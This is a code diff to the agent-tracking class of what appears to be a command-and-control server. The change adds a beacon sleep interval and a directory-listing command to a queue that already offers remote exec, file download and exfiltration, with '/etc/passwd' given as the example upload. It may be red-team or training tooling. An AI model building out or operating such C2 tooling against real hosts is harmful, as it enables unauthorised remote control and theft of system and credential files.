@@ -13,18 +13,21 @@ class Agent:
         self.downloaded_files = []  # Track files sent to this agent
         self.last_seen = datetime.now().isoformat()  # Track last communication
         self.joined_at = datetime.now().isoformat()  # Track when agent joined
+        self.sleep_time = 3  # Agent polling interval in seconds (default: 3)
 
     def add_command(self, command_type: str, command_data: Dict[str, Any]) -> int:
         """
         Add a new command to the queue
 
         Args:
-            command_type: "exec", "upload", "download", or "terminate"
+            command_type: "exec", "upload", "download", "terminate", "list_directory", or "set_sleep_time"
             command_data: Command-specific data dict
                 - exec: {"command": "whoami"}
                 - upload: {"source_path": "/etc/passwd", "filename": "passwd.txt"}
                 - download: {"url": "/files/tool.exe", "save_as": "tool.exe"}
                 - terminate: {} (no data needed, gracefully shuts down agent)
+                - list_directory: {"path": "/path/to/directory"}
+                - set_sleep_time: {"sleep_time": 5}
 
         Returns:
             command_id: The ID of the created command
@@ -112,6 +115,10 @@ class Agent:
         """Update the last seen timestamp"""
         self.last_seen = datetime.now().isoformat()
 
+    def set_sleep_time(self, sleep_time: int):
+        """Update the agent's sleep time"""
+        self.sleep_time = sleep_time
+
     def to_dict(self) -> Dict[str, Any]:
         """Return agent info as dictionary for API responses"""
         return {
@@ -123,5 +130,6 @@ class Agent:
             'joined_at': self.joined_at,
             'total_commands': len(self.commands),
             'uploaded_files_count': len(self.uploaded_files),
-            'downloaded_files_count': len(self.downloaded_files)
+            'downloaded_files_count': len(self.downloaded_files),
+            'sleep_time': self.sleep_time
         }
